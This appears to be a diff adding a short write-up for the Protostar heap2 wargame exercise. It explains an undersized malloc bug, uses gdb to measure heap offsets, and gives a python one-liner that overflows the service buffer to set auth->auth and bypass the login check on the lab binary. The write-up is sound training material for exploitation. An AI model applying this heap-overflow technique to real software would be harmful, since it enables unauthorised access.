@@ -1,0 +1,57 @@
+- there's a problem with:
+struct auth *auth;
+...
+auth = malloc(sizeof(auth));
+
+This allocates only the size for a pointer - 4 bytes. 
+
+- auth and service structures are adjacent in the heap. If we allocate first
+auth, and then do service = strdup(line + 7), we can repace auth->auth
+
+- calculate the needed filler:
+user@protostar:/opt/protostar/bin$ gdb -q heap2
+(gdb) b *main+72
+Breakpoint 1 at 0x804897c: file heap2/heap2.c, line 22.
+(gdb) run
+Starting program: /opt/protostar/bin/heap2 
+[ auth = (nil), service = (nil) ]
+
+Breakpoint 1, 0x0804897c in main (argc=1, argv=0xbffff874) at heap2/heap2.c:22
+22	heap2/heap2.c: No such file or directory.
+	in heap2/heap2.c
+(gdb) c
+Continuing.
+auth JDOE
+[ auth = 0x804c008, service = (nil) ]
+
+Breakpoint 1, 0x0804897c in main (argc=1, argv=0xbffff874) at heap2/heap2.c:22
+22	in heap2/heap2.c
+(gdb) c
+Continuing.
+service AAAA
+[ auth = 0x804c008, service = 0x804c018 ]
+
+Breakpoint 1, 0x0804897c in main (argc=1, argv=0xbffff874) at heap2/heap2.c:22
+22	in heap2/heap2.c
+(gdb) p auth
+$1 = (struct auth *) 0x804c008
+(gdb) p &auth->name
+$2 = (char (*)[32]) 0x804c008
+(gdb) p &auth->auth
+$3 = (int *) 0x804c028
+(gdb) p service
+$4 = 0x804c018 " AAAA\n"
+(gdb) 
+
+- so auth->auth is at 0x804c028 and service at 0x804c018. We need to add 0x10 filler
+bytes in service to reach auth->auth
+
+Wrap up:
+$ python -c 'print "auth JDOE\n" + "service" + "X" * 16 + "\n" + "login\n"' | ./heap2 
+[ auth = (nil), service = (nil) ]
+[ auth = 0x804c008, service = (nil) ]
+[ auth = 0x804c008, service = 0x804c018 ]
+you have logged in already!
+[ auth = 0x804c008, service = 0x804c018 ]
+[ auth = 0x804c008, service = 0x804c018 ]
+
